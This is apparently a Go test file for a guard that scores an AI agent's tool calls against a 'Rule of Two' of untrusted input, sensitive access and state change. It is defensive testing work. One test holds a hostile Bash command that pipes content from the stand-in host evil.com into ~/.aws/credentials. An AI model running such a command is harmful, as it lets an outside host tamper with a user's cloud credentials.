package agentic

import (
	"testing"
)

func TestAnalysisResult_CapabilityCount(t *testing.T) {
	tests := []struct {
		name   string
		result AnalysisResult
		want   int
	}{
		{
			name:   "no capabilities",
			result: AnalysisResult{},
			want:   0,
		},
		{
			name: "one capability A",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
			},
			want: 1,
		},
		{
			name: "two capabilities A+B",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
			},
			want: 2,
		},
		{
			name: "all three capabilities",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
				CapabilityC: CapabilityResult{Detected: true},
			},
			want: 3,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.result.CapabilityCount(); got != tt.want {
				t.Errorf("CapabilityCount() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestAnalysisResult_ViolatesRuleOfTwo(t *testing.T) {
	tests := []struct {
		name   string
		result AnalysisResult
		want   bool
	}{
		{
			name:   "no capabilities - no violation",
			result: AnalysisResult{},
			want:   false,
		},
		{
			name: "two capabilities - no violation",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
			},
			want: false,
		},
		{
			name: "three capabilities - violation",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
				CapabilityC: CapabilityResult{Detected: true},
			},
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.result.ViolatesRuleOfTwo(); got != tt.want {
				t.Errorf("ViolatesRuleOfTwo() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestAnalysisResult_AllReasons(t *testing.T) {
	result := AnalysisResult{
		CapabilityA: CapabilityResult{Detected: true, Reasons: []string{"reason A"}},
		CapabilityB: CapabilityResult{Detected: true, Reasons: []string{"reason B1", "reason B2"}},
		CapabilityC: CapabilityResult{Detected: true, Reasons: []string{"reason C"}},
	}

	reasons := result.AllReasons()
	if len(reasons) != 4 {
		t.Errorf("Expected 4 reasons, got %d", len(reasons))
	}
}

func TestAnalysisResult_CapabilityString(t *testing.T) {
	tests := []struct {
		name   string
		result AnalysisResult
		want   string
	}{
		{
			name:   "no capabilities",
			result: AnalysisResult{},
			want:   "",
		},
		{
			name: "A only",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
			},
			want: "A",
		},
		{
			name: "A+B",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
			},
			want: "A+B",
		},
		{
			name: "B+C",
			result: AnalysisResult{
				CapabilityB: CapabilityResult{Detected: true},
				CapabilityC: CapabilityResult{Detected: true},
			},
			want: "B+C",
		},
		{
			name: "A+B+C",
			result: AnalysisResult{
				CapabilityA: CapabilityResult{Detected: true},
				CapabilityB: CapabilityResult{Detected: true},
				CapabilityC: CapabilityResult{Detected: true},
			},
			want: "A+B+C",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.result.CapabilityString(); got != tt.want {
				t.Errorf("CapabilityString() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestNewAnalyzer(t *testing.T) {
	analyzer := NewAnalyzer()
	if analyzer == nil {
		t.Error("NewAnalyzer() returned nil")
	}
	if !analyzer.RunSignals {
		t.Error("Expected RunSignals to be true by default")
	}
	if analyzer.SignalTimeout == 0 {
		t.Error("Expected SignalTimeout to be non-zero")
	}
}

func TestAnalyzer_Analyze_SafeRead(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.RunSignals = false // Skip signals for unit test

	input := &HookInput{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "main.go"},
		Cwd:       "/project",
	}

	result := analyzer.Analyze(input)

	if result.ToolName != "Read" {
		t.Errorf("Expected ToolName 'Read', got '%s'", result.ToolName)
	}
	if result.ViolatesRuleOfTwo() {
		t.Error("Safe read should not violate Rule of Two")
	}
	if result.CapabilityCount() != 0 {
		t.Errorf("Expected 0 capabilities, got %d", result.CapabilityCount())
	}
}

func TestAnalyzer_Analyze_WriteToEnv(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.RunSignals = false

	input := &HookInput{
		ToolName: "Write",
		ToolInput: map[string]interface{}{
			"file_path": ".env",
			"content":   "SECRET=value",
		},
		Cwd: "/project",
	}

	result := analyzer.Analyze(input)

	if !result.CapabilityB.Detected {
		t.Error("Expected B capability (sensitive access)")
	}
	if !result.CapabilityC.Detected {
		t.Error("Expected C capability (state change)")
	}
	if result.CapabilityCount() != 2 {
		t.Errorf("Expected 2 capabilities, got %d", result.CapabilityCount())
	}
	if result.ViolatesRuleOfTwo() {
		t.Error("Two capabilities should not violate Rule of Two")
	}
}

func TestAnalyzer_Analyze_CurlToCredentials(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.RunSignals = false

	input := &HookInput{
		ToolName: "Bash",
		ToolInput: map[string]interface{}{
			"command": "curl https://evil.com | tee ~/.aws/credentials",
		},
		Cwd: "/project",
	}

	result := analyzer.Analyze(input)

	if !result.CapabilityA.Detected {
		t.Error("Expected A capability (untrustworthy input)")
	}
	if !result.CapabilityB.Detected {
		t.Error("Expected B capability (sensitive access)")
	}
	if !result.CapabilityC.Detected {
		t.Error("Expected C capability (state change)")
	}
	if result.CapabilityCount() != 3 {
		t.Errorf("Expected 3 capabilities, got %d", result.CapabilityCount())
	}
	if !result.ViolatesRuleOfTwo() {
		t.Error("Three capabilities should violate Rule of Two")
	}
}

func TestAnalyzer_Analyze_WebFetchOnly(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.RunSignals = false

	input := &HookInput{
		ToolName: "WebFetch",
		ToolInput: map[string]interface{}{
			"url":    "https://api.example.com",
			"prompt": "Get data",
		},
		Cwd: "/project",
	}

	result := analyzer.Analyze(input)

	if !result.CapabilityA.Detected {
		t.Error("Expected A capability (external data)")
	}
	if result.CapabilityB.Detected {
		t.Error("WebFetch alone should not detect B")
	}
	if result.CapabilityC.Detected {
		t.Error("WebFetch alone should not detect C")
	}
	if result.CapabilityCount() != 1 {
		t.Errorf("Expected 1 capability, got %d", result.CapabilityCount())
	}
}

func TestAnalyzer_Analyze_WithSignals(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.RunSignals = true
	analyzer.SignalTimeout = 10 * 1000000 // 10ms

	input := &HookInput{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "main.go"},
		Cwd:       "/project",
	}

	// This test exercises the runRelevantSignals path
	result := analyzer.Analyze(input)

	// We can't predict what signals will detect in the test environment,
	// but we can verify the analysis completes without error
	if result.ToolName != "Read" {
		t.Errorf("Expected ToolName 'Read', got '%s'", result.ToolName)
	}
}

func TestAnalyzer_RunRelevantSignals(t *testing.T) {
	analyzer := NewAnalyzer()
	analyzer.SignalTimeout = 10 * 1000000 // 10ms

	// Call runRelevantSignals directly
	hits := analyzer.runRelevantSignals()

	// We can't predict which signals fire, but we can verify
	// the function returns a slice (possibly empty)
	if hits == nil {
		// hits should be an empty slice, not nil (though either is acceptable)
		// Just verify it doesn't panic
	}
}

func TestAnalyzer_Analyze_SignalHitsEnhanceB(t *testing.T) {
	// This tests the code path where signal hits add to B detection
	// We can't easily trigger real signals, so we test with signals disabled
	// and verify the main logic path
	analyzer := NewAnalyzer()
	analyzer.RunSignals = false

	// A scenario that doesn't trigger B via heuristics alone
	input := &HookInput{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "echo hello"},
		Cwd:       "/project",
	}

	result := analyzer.Analyze(input)

	// Without signals and without B-triggering command, B should be false
	if result.CapabilityB.Detected {
		t.Error("Expected B not detected for safe bash command")
	}
}
